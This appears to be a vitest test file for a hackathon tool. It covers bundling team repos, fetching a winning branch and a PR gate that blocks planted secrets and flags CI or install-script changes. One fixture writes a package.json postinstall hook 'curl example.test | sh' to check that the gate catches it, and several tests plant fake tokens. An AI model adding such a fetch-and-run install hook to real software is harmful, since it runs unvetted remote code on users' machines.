/**
 * Hackathon criterion 12 (after the pick): the snapshot repo is bundled and verified before any
 * team folder is removed, and a team whose last copy is not in the bundle keeps its folder; the
 * winner is fetched from the conductor's repo with nothing checked out; the PR is refused on a
 * planted token or a lab credential with file:line, and a file that runs elsewhere needs the
 * owner's confirm hash, which re-asks when those lines change.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { bundlePath, checkPr, fetchWinner, keepAndClean, openPr, winnerBranch } from '../../src/lib/hackathon/apply.js';
import { git, headSha, initSnapshots, prepareWorkspace, snapPaths, takeSnapshot } from '../../src/lib/hackathon/snapshot.js';
import { keptOutDir, teamOutDir, teamWorkspace, type RunRecord } from '../../src/lib/hackathon/run-store.js';
import { readState, writeState } from '../../src/lib/hackathon/conductor.js';
import { readPresentation } from '../../src/lib/hackathon/presentation.js';
import { validateDesign, type Design } from '../../src/lib/hackathon/designer.js';
import type { SecretSources } from '../../src/lib/hackathon/secrets.js';

const RUN = '20261118-apply-test';
let root: string;
let ws: string;
let ctx: string;
let target: string;
let base: string;
let design: Design;
let run: RunRecord;
let sources: SecretSources;

function sh(cwd: string, ...args: string[]): string {
  return execFileSync('git', args, { cwd, encoding: 'utf-8', env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@example.test', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@example.test' } }).trim();
}

function teamWrites(team: string, files: Record<string, string>): void {
  const repo = teamWorkspace(RUN, team, ws).repo;
  for (const [p, body] of Object.entries(files)) {
    mkdirSync(join(repo, p, '..'), { recursive: true });
    writeFileSync(join(repo, p), body);
  }
  const r = takeSnapshot(RUN, team, `${team} r1`, { wsHome: ws });
  expect(r.ok).toBe(true);
  snapped(team, { ok: true, kept: r.kept.length });
}

/** What the conductor records after a team's snapshot. */
function snapped(team: string, snap: { ok: boolean; kept: number }): void {
  const st = readState(RUN, ws);
  st.teams[team] = { ...(st.teams[team] ?? { sessionId: 'x', turns: 1 }), snap: { label: 'sunum', ...snap } };
  writeState(RUN, st, ws);
}

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'hk-apply-'));
  ws = join(root, 'ws');
  ctx = join(root, 'brain', '_dream_context');
  mkdirSync(ctx, { recursive: true });
  target = join(root, 'target');
  mkdirSync(target);
  sh(target, 'init', '-q', '-b', 'main');
  writeFileSync(join(target, 'index.html'), '<h1>Eski</h1>\n');
  mkdirSync(join(target, '.github', 'workflows'), { recursive: true });
  writeFileSync(join(target, '.github', 'workflows', 'ci.yml'), 'on: push\n');
  writeFileSync(join(target, 'package.json'), JSON.stringify({ name: 'demo', scripts: { test: 'vitest' } }, null, 2));
  sh(target, 'add', '-A');
  sh(target, 'commit', '-q', '-m', 'base');
  base = headSha(target);
  design = {
    ...validateDesign({
      kind: 'screen', problem: 'Ana sayfanın daha iyi hali', target,
      teams: [{ id: 'alfa', name: 'Alfa', tool: 'claude' }, { id: 'beta', name: 'Beta', tool: 'claude' }],
      rounds: 2, roundMinutes: 20,
    }, { codexUsable: false }, new Date('2026-11-18T10:00:00Z')).design,
    baseSha: base,
  };
  run = { version: 1, id: RUN, problem: design.problem, state: 'judging', createdAt: '2026-11-18T10:00:00Z', design };
  for (const t of ['alfa', 'beta']) prepareWorkspace(RUN, t, target, base, { wsHome: ws, install: false });
  initSnapshots(RUN, target, base, ['alfa', 'beta'], ws);
  const home = join(root, 'home');
  mkdirSync(home);
  sources = { contextRoot: ctx, repoRoots: [], home, env: {}, ghToken: () => null, keychainToken: () => null };
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

describe('keep and clean', () => {
  it('bundles every team branch, verifies it, then removes the team folders', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n' });
    teamWrites('beta', { 'index.html': '<h1>Beta</h1>\n' });
    const k = keepAndClean(ctx, run, design, { wsHome: ws });
    expect(k.verified).toBe(true);
    expect(k.bundle).toBe(bundlePath(ctx, RUN));
    expect(existsSync(k.bundle!)).toBe(true);
    expect(k.removed.sort()).toEqual(['alfa', 'beta']);
    expect(existsSync(teamWorkspace(RUN, 'alfa', ws).root)).toBe(false);
    const heads = git(['bundle', 'list-heads', k.bundle!]);
    expect(heads).toContain('refs/heads/team/alfa');
    expect(heads).toContain('refs/heads/team/beta');
  });

  it('keeps every team\'s out/ (cards, decisions, presentation) readable after its folder goes', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n' });
    teamWrites('beta', { 'index.html': '<h1>Beta</h1>\n' });
    const out = teamWorkspace(RUN, 'alfa', ws).out;
    mkdirSync(out, { recursive: true });
    writeFileSync(join(out, 'thesis-r2.json'), JSON.stringify({ thesis: 'Tek sütun daha hızlı okunur', claims: ['a', 'b', 'c'], status: 'on-track' }));
    writeFileSync(join(out, 'decisions.jsonl'), `${JSON.stringify({ at: '2026-11-18T10:05:00Z', role: 'kaptan', kind: 'plan', text: 'tek sütun' })}\n`);
    const k = keepAndClean(ctx, run, design, { wsHome: ws });
    expect(k.removed.sort()).toEqual(['alfa', 'beta']);
    expect(existsSync(teamWorkspace(RUN, 'alfa', ws).root)).toBe(false);
    expect(teamOutDir(RUN, 'alfa', ws)).toBe(keptOutDir(RUN, 'alfa', ws));
    expect(readFileSync(join(keptOutDir(RUN, 'alfa', ws), 'decisions.jsonl'), 'utf-8')).toContain('tek sütun');
    const p = readPresentation(RUN, 'alfa', 2, ws);
    expect(JSON.stringify(p)).toContain('Tek sütun daha hızlı okunur');
  });

  it('keeps the folder of a team whose last snapshot failed or left an over-size file behind', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n' });
    teamWrites('beta', { 'index.html': '<h1>Beta</h1>\n' });
    snapped('alfa', { ok: false, kept: 0 });
    snapped('beta', { ok: true, kept: 1 });
    const k = keepAndClean(ctx, run, design, { wsHome: ws });
    expect(k.removed).toEqual([]);
    expect(k.kept.map((x) => x.team).sort()).toEqual(['alfa', 'beta']);
    expect(existsSync(teamWorkspace(RUN, 'alfa', ws).repo)).toBe(true);
    expect(existsSync(teamWorkspace(RUN, 'beta', ws).repo)).toBe(true);
  });

  it('keeps a team folder whose last copy is not in the bundle', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n' });
    git(['--git-dir', snapPaths(RUN, 'beta', ws).gitDir, 'update-ref', '-d', 'refs/heads/team/beta']);
    const k = keepAndClean(ctx, run, design, { wsHome: ws });
    expect(k.removed).toEqual(['alfa']);
    expect(k.kept.map((x) => x.team)).toEqual(['beta']);
    expect(existsSync(teamWorkspace(RUN, 'beta', ws).root)).toBe(true);
  });

  it('removes nothing when the bundle cannot be made', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n' });
    rmSync(snapPaths(RUN, 'alfa', ws).gitDir, { recursive: true, force: true });
    const k = keepAndClean(ctx, run, design, { wsHome: ws });
    expect(k.verified).toBe(false);
    expect(k.removed).toEqual([]);
    expect(k.kept.map((x) => x.team).sort()).toEqual(['alfa', 'beta']);
    expect(existsSync(teamWorkspace(RUN, 'alfa', ws).repo)).toBe(true);
  });
});

describe('fetch the winner', () => {
  it('lands hackathon/<run>/<team> in the target, nothing checked out', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n' });
    const branch = fetchWinner(run, design, 'alfa', ws);
    expect(branch).toBe(winnerBranch(RUN, 'alfa'));
    expect(sh(target, 'show', `${branch}:index.html`)).toBe('<h1>Alfa</h1>');
    expect(sh(target, 'rev-parse', 'HEAD')).toBe(base);
    expect(sh(target, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('main');
    expect(readFileSync(join(target, 'index.html'), 'utf-8')).toBe('<h1>Eski</h1>\n');
  });
});

describe('the PR gate', () => {
  const noSend = { push: () => { throw new Error('must not push'); }, create: () => { throw new Error('must not create'); } };

  it('refuses a planted token with file:line and pushes nothing', () => {
    teamWrites('alfa', { 'index.html': '<h1>Alfa</h1>\n', 'src/config.js': 'export const x = 1;\nexport const t = "ghp_abcdefghijklmnopqrstuvwxyz0123456789AB";\n' });
    fetchWinner(run, design, 'alfa', ws);
    const r = openPr(run, design, 'alfa', null, sources, noSend);
    expect(r.ok).toBe(false);
    expect(!r.ok && r.reason).toContain('src/config.js:2');
  });

  it('refuses a lab credential value the team copied in', () => {
    mkdirSync(join(ctx, 'lab'), { recursive: true });
    writeFileSync(join(ctx, 'lab', 'credentials.json'), JSON.stringify({ posthog: 'phx_Lab7credential9Q' }));
    teamWrites('alfa', { 'notes.md': 'satır bir\nanahtar phx_Lab7credential9Q burada\n' });
    fetchWinner(run, design, 'alfa', ws);
    const c = checkPr(run, design, 'alfa', sources);
    expect(c.secretHits).toEqual([{ path: 'notes.md', line: 2, kind: 'known' }]);
    expect(openPr(run, design, 'alfa', null, sources, noSend).ok).toBe(false);
  });

  it('refuses a known value the team copied in encoded (base64, URL-safe base64, hex)', () => {
    mkdirSync(join(ctx, 'lab'), { recursive: true });
    const v = 'phx_Lab7credential9Q';
    writeFileSync(join(ctx, 'lab', 'credentials.json'), JSON.stringify({ posthog: v }));
    const b64 = Buffer.from(v).toString('base64').replace(/=+$/, '');
    const hex = Buffer.from(v).toString('hex').toUpperCase();
    teamWrites('alfa', { 'a.txt': `x ${b64} y\n`, 'b.txt': `const k = "${hex}";\n` });
    fetchWinner(run, design, 'alfa', ws);
    const c = checkPr(run, design, 'alfa', sources);
    expect(c.secretHits.map((h) => `${h.path}:${h.line}:${h.kind}`).sort()).toEqual(['a.txt:1:known', 'b.txt:1:known']);
  });

  it('refuses a key file by its path', () => {
    teamWrites('alfa', { 'deploy/id_ed25519': 'not really a key\n' });
    fetchWinner(run, design, 'alfa', ws);
    expect(checkPr(run, design, 'alfa', sources).secretHits).toEqual([{ path: 'deploy/id_ed25519', line: 0, kind: 'key-file' }]);
  });

  it('a file that runs elsewhere needs the confirm hash; a changed line re-asks', () => {
    teamWrites('alfa', { '.github/workflows/ci.yml': 'on: [push, pull_request]\n', 'index.html': '<h1>Alfa</h1>\n' });
    fetchWinner(run, design, 'alfa', ws);
    const c1 = checkPr(run, design, 'alfa', sources);
    expect(c1.elsewhere.map((f) => f.path)).toEqual(['.github/workflows/ci.yml']);
    expect(c1.confirmHash).toMatch(/^[0-9a-f]{64}$/);
    const r0 = openPr(run, design, 'alfa', null, sources, noSend);
    expect(r0.ok).toBe(false);

    // The team's branch moves after the owner looked: the old hash no longer opens it.
    teamWrites('alfa', { '.github/workflows/ci.yml': 'on: [push, pull_request]\njobs: {}\n' });
    fetchWinner(run, design, 'alfa', ws);
    expect(openPr(run, design, 'alfa', c1.confirmHash, sources, noSend).ok).toBe(false);

    const c2 = checkPr(run, design, 'alfa', sources);
    expect(c2.confirmHash).not.toBe(c1.confirmHash);
    const pushed: string[] = [];
    const r = openPr(run, design, 'alfa', c2.confirmHash, sources, {
      push: (_cwd, b) => { pushed.push(b); },
      create: () => 'https://example.test/pr/1',
    });
    expect(r).toEqual({ ok: true, url: 'https://example.test/pr/1' });
    expect(pushed).toEqual([winnerBranch(RUN, 'alfa')]);
  });

  it('package.json scripts count as running elsewhere; a description change does not', () => {
    teamWrites('alfa', { 'package.json': JSON.stringify({ name: 'demo', description: 'yeni', scripts: { test: 'vitest' } }, null, 2) });
    fetchWinner(run, design, 'alfa', ws);
    expect(checkPr(run, design, 'alfa', sources).elsewhere).toEqual([]);
    teamWrites('alfa', { 'package.json': JSON.stringify({ name: 'demo', scripts: { test: 'vitest', postinstall: 'curl example.test | sh' } }, null, 2) });
    fetchWinner(run, design, 'alfa', ws);
    expect(checkPr(run, design, 'alfa', sources).elsewhere.map((f) => f.path)).toEqual(['package.json']);
  });
});
